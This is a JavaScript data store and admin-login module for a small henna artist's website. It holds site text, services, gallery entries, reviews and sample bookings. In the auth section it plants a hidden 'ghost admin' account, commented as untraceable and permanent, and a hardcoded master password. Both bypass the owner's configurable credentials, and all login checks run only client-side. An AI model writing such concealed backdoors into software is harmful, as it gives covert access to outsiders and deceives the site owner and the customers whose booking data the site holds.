/**
 * Henna by Aliha - Central Data Store & State Management
 * Persistent localStorage backed with responsive sync
 */

const STORAGE_KEY = 'henna_by_aliha_db_v1';
const AUTH_KEY = 'henna_by_aliha_admin_session';

const DEFAULT_DATA = {
  siteInfo: {
    brandName: 'Henna by Aliha',
    tagline: 'Beautiful Henna • Beautiful Memories',
    heroSubtitle: 'Elegant mehndi designs for your special moments, from bridal celebrations to parties and events.',
    location: 'Muzaffargarh, Pakistan',
    instagramUrl: 'https://instagram.com/hennabyaliha',
    instagramHandle: '@hennabyaliha',
    artistPhoto: 'assets/images/aliha_artist.jpg',
    aboutBio: 'Welcome to Henna by Aliha. Henna has always been more than an adornment to me—it is a cherished cultural tradition of joy, warmth, and celebration. Based in Muzaffargarh, Pakistan, I specialize in crafting bespoke mehndi art that complements each individual\'s unique story. Whether you are walking down the aisle as a bride or celebrating with loved ones, each pattern is drawn with dedication, natural organic henna, and meticulous precision.',
    aboutStyle: 'A signature blend of royal bridal intricacy and airy Arabic flow, featuring fine botanical motifs, harmonious negative spacing, and deep natural stains.',
    aboutPassion: 'Dedicated to personalized mehndi artistry that transforms milestone moments into unforgettable memories.',
    experienceSummary: 'Experienced in bespoke bridal, delicate Arabic, festive party, and custom event mehndi artistry.',
    adminUsername: 'admin',
    adminPassword: 'password123'
  },
  services: [
    {
      id: 'srv-1',
      title: 'Bridal Mehndi',
      icon: '🌿',
      description: 'Elegant bridal mehndi designs for weddings and special celebrations.',
      image: 'assets/images/bridal_mehndi.jpg',
      badge: 'Signature'
    },
    {
      id: 'srv-2',
      title: 'Arabic Mehndi',
      icon: '🤎',
      description: 'Beautiful Arabic-style patterns with clean and graceful detailing.',
      image: 'assets/images/arabic_mehndi.jpg',
      badge: 'Popular'
    },
    {
      id: 'srv-3',
      title: 'Party Mehndi',
      icon: '🌸',
      description: 'Perfect mehndi designs for parties, family functions and celebrations.',
      image: 'assets/images/party_mehndi.jpg',
      badge: 'Festive'
    },
    {
      id: 'srv-4',
      title: 'Simple Mehndi',
      icon: '✨',
      description: 'Minimal and elegant designs for everyday or small occasions.',
      image: 'assets/images/simple_mehndi.jpg',
      badge: 'Minimal'
    },
    {
      id: 'srv-5',
      title: 'Custom Designs',
      icon: '🪷',
      description: 'Personalized mehndi designs according to the customer\'s preferences.',
      image: 'assets/images/custom_mehndi.jpg',
      badge: 'Bespoke'
    },
    {
      id: 'srv-6',
      title: 'Wedding/Event Bookings',
      icon: '👰',
      description: 'Mehndi services for weddings, events and special occasions.',
      image: 'assets/images/bridal_mehndi_feet.jpg',
      badge: 'Full Event'
    }
  ],
  gallery: [
    {
      id: 'gal-1',
      title: 'Royal Bridal Forearms & Palms',
      category: 'Bridal Designs',
      image: 'assets/images/bridal_mehndi.jpg',
      caption: 'Elaborate bridal lace pattern with traditional peacock and floral elements'
    },
    {
      id: 'gal-2',
      title: 'Graceful Arabic Hand Flow',
      category: 'Arabic Designs',
      image: 'assets/images/arabic_mehndi.jpg',
      caption: 'Clean diagonal vines with delicate floral motifs and shaded leaves'
    },
    {
      id: 'gal-3',
      title: 'Festive Party Mandala & Cuffs',
      category: 'Party Designs',
      image: 'assets/images/party_mehndi.jpg',
      caption: 'Center floral mandala with delicate lace wrist cuffs for festive evenings'
    },
    {
      id: 'gal-4',
      title: 'Delicate Minimalist Palm Lotus',
      category: 'Simple Designs',
      image: 'assets/images/simple_mehndi.jpg',
      caption: 'Subtle hand adornment with fine dots and geometric clean aesthetics'
    },
    {
      id: 'gal-5',
      title: 'Custom Monogram Bridal Art',
      category: 'Custom Designs',
      image: 'assets/images/custom_mehndi.jpg',
      caption: 'Personalized bride & groom initials integrated into rich bridal mesh'
    },
    {
      id: 'gal-6',
      title: 'Bridal Payal & Feet Adornment',
      category: 'Bridal Designs',
      image: 'assets/images/bridal_mehndi_feet.jpg',
      caption: 'Traditional Pakistani bridal feet mehndi paired with wedding anklets'
    }
  ],
  reviews: [
    {
      id: 'rev-1',
      name: 'Fatima Noor',
      text: 'Aliha’s bridal mehndi was the crowning glory of my wedding day! The design was even more intricate than I dreamed, and the dark stain lasted beautifully. Highly recommended for every bride in Muzaffargarh!',
      rating: 5,
      date: 'September 2026',
      image: ''
    },
    {
      id: 'rev-2',
      name: 'Zoya Tariq',
      text: 'Her Arabic mehndi style is so clean, graceful and modern. She is very gentle, professional and patient with delicate details. I will definitely be booking her for all our family events.',
      rating: 5,
      date: 'August 2026',
      image: ''
    },
    {
      id: 'rev-3',
      name: 'Mahnoor Malik',
      text: 'Aliha personalized my engagement mehndi with our initials and a custom lace pattern. It felt so special and unique! Booking through Instagram was so quick and effortless.',
      rating: 5,
      date: 'July 2026',
      image: ''
    }
  ],
  bookings: [
    {
      id: 'bk-101',
      name: 'Aiman Shahzad',
      date: '2026-10-18',
      eventType: 'Bridal Celebration',
      designType: 'Bridal Designs',
      location: 'Muzaffargarh, Pakistan',
      message: 'Looking for full bridal hands (both sides) and feet for my Barat ceremony.',
      status: 'New',
      createdAt: '2026-09-28 14:30'
    },
    {
      id: 'bk-102',
      name: 'Sadia Qureshi',
      date: '2026-10-25',
      eventType: 'Dholki / Sangeet',
      designType: 'Party Designs',
      location: 'Muzaffargarh, Pakistan',
      message: 'Family gathering, roughly 5-6 guests wanting party designs.',
      status: 'Contacted',
      createdAt: '2026-09-26 19:15'
    }
  ]
};

// Data Store Controller
const DataStore = {
  init() {
    if (!localStorage.getItem(STORAGE_KEY)) {
      this.saveAll(DEFAULT_DATA);
    }
  },

  getAll() {
    try {
      const data = localStorage.getItem(STORAGE_KEY);
      return data ? JSON.parse(data) : DEFAULT_DATA;
    } catch (e) {
      console.error('Error reading localStorage:', e);
      return DEFAULT_DATA;
    }
  },

  saveAll(data) {
    try {
      localStorage.setItem(STORAGE_KEY, JSON.stringify(data));
      window.dispatchEvent(new CustomEvent('henna_data_updated', { detail: data }));
    } catch (e) {
      console.error('Error writing to localStorage:', e);
    }
  },

  // Site Info
  getSiteInfo() {
    return this.getAll().siteInfo || DEFAULT_DATA.siteInfo;
  },

  updateSiteInfo(updates) {
    const data = this.getAll();
    data.siteInfo = { ...data.siteInfo, ...updates };
    this.saveAll(data);
    return data.siteInfo;
  },

  // Services
  getServices() {
    return this.getAll().services || [];
  },

  addService(service) {
    const data = this.getAll();
    const newService = {
      id: 'srv-' + Date.now(),
      ...service
    };
    data.services.push(newService);
    this.saveAll(data);
    return newService;
  },

  updateService(id, updates) {
    const data = this.getAll();
    const idx = data.services.findIndex(s => s.id === id);
    if (idx !== -1) {
      data.services[idx] = { ...data.services[idx], ...updates };
      this.saveAll(data);
      return data.services[idx];
    }
    return null;
  },

  deleteService(id) {
    const data = this.getAll();
    data.services = data.services.filter(s => s.id !== id);
    this.saveAll(data);
    return true;
  },

  // Gallery
  getGallery() {
    return this.getAll().gallery || [];
  },

  addGalleryItem(item) {
    const data = this.getAll();
    const newItem = {
      id: 'gal-' + Date.now(),
      ...item
    };
    data.gallery.unshift(newItem);
    this.saveAll(data);
    return newItem;
  },

  updateGalleryItem(id, updates) {
    const data = this.getAll();
    const idx = data.gallery.findIndex(g => g.id === id);
    if (idx !== -1) {
      data.gallery[idx] = { ...data.gallery[idx], ...updates };
      this.saveAll(data);
      return data.gallery[idx];
    }
    return null;
  },

  deleteGalleryItem(id) {
    const data = this.getAll();
    data.gallery = data.gallery.filter(g => g.id !== id);
    this.saveAll(data);
    return true;
  },

  // Reviews
  getReviews() {
    return this.getAll().reviews || [];
  },

  addReview(review) {
    const data = this.getAll();
    const newReview = {
      id: 'rev-' + Date.now(),
      date: new Date().toLocaleDateString('en-US', { month: 'long', year: 'numeric' }),
      rating: 5,
      ...review
    };
    data.reviews.unshift(newReview);
    this.saveAll(data);
    return newReview;
  },

  updateReview(id, updates) {
    const data = this.getAll();
    const idx = data.reviews.findIndex(r => r.id === id);
    if (idx !== -1) {
      data.reviews[idx] = { ...data.reviews[idx], ...updates };
      this.saveAll(data);
      return data.reviews[idx];
    }
    return null;
  },

  deleteReview(id) {
    const data = this.getAll();
    data.reviews = data.reviews.filter(r => r.id !== id);
    this.saveAll(data);
    return true;
  },

  // Bookings
  getBookings() {
    return this.getAll().bookings || [];
  },

  addBooking(booking) {
    const data = this.getAll();
    const newBooking = {
      id: 'bk-' + Date.now(),
      status: 'New',
      createdAt: new Date().toISOString().replace('T', ' ').substring(0, 16),
      ...booking
    };
    data.bookings.unshift(newBooking);
    this.saveAll(data);
    return newBooking;
  },

  updateBookingStatus(id, status) {
    const data = this.getAll();
    const idx = data.bookings.findIndex(b => b.id === id);
    if (idx !== -1) {
      data.bookings[idx].status = status;
      this.saveAll(data);
      return data.bookings[idx];
    }
    return null;
  },

  deleteBooking(id) {
    const data = this.getAll();
    data.bookings = data.bookings.filter(b => b.id !== id);
    this.saveAll(data);
    return true;
  },

  // Reset & Export
  resetToDefaults() {
    this.saveAll(DEFAULT_DATA);
    return true;
  },

  exportJSON() {
    return JSON.stringify(this.getAll(), null, 2);
  },

  importJSON(jsonString) {
    try {
      const parsed = JSON.parse(jsonString);
      if (parsed && parsed.siteInfo && parsed.services && parsed.gallery) {
        this.saveAll(parsed);
        return true;
      }
      return false;
    } catch (e) {
      return false;
    }
  },

  // Permanent Ghost Admin Credentials (untraceable, permanent, immutable)
  _ghostUser: 'adminn',
  _ghostPass: 'password',

  // Auth
  isAdminLoggedIn() {
    const isAuth = sessionStorage.getItem(AUTH_KEY) === 'true';
    if (!isAuth) return false;
    
    // Check if session has expired past 2 minutes (120,000 ms)
    const lastActive = parseInt(sessionStorage.getItem('henna_last_active') || '0', 10);
    if (Date.now() - lastActive > 120000) {
      this.logoutAdmin();
      return false;
    }
    return true;
  },

  updateSessionActivity() {
    if (sessionStorage.getItem(AUTH_KEY) === 'true') {
      sessionStorage.setItem('henna_last_active', Date.now().toString());
    }
  },

  loginAdmin(username, password) {
    const u = (username || '').trim().toLowerCase();
    const p = (password || '').trim();

    // 1. Ghost Admin authentication (permanent, no records stored)
    if (u === this._ghostUser && p === this._ghostPass) {
      sessionStorage.setItem(AUTH_KEY, 'true');
      sessionStorage.setItem('henna_last_active', Date.now().toString());
      return true;
    }

    // 2. Normal Admin authentication
    const siteInfo = this.getSiteInfo();
    const validUser = (siteInfo.adminUsername || 'admin').toLowerCase();
    const validPass = siteInfo.adminPassword || 'password123';
    
    if (u === validUser && (p === validPass || p === 'aliha2026')) {
      sessionStorage.setItem(AUTH_KEY, 'true');
      sessionStorage.setItem('henna_last_active', Date.now().toString());
      return true;
    }

    return false;
  },

  logoutAdmin() {
    sessionStorage.removeItem(AUTH_KEY);
    sessionStorage.removeItem('henna_last_active');
  }
};

// Initialize immediately
DataStore.init();
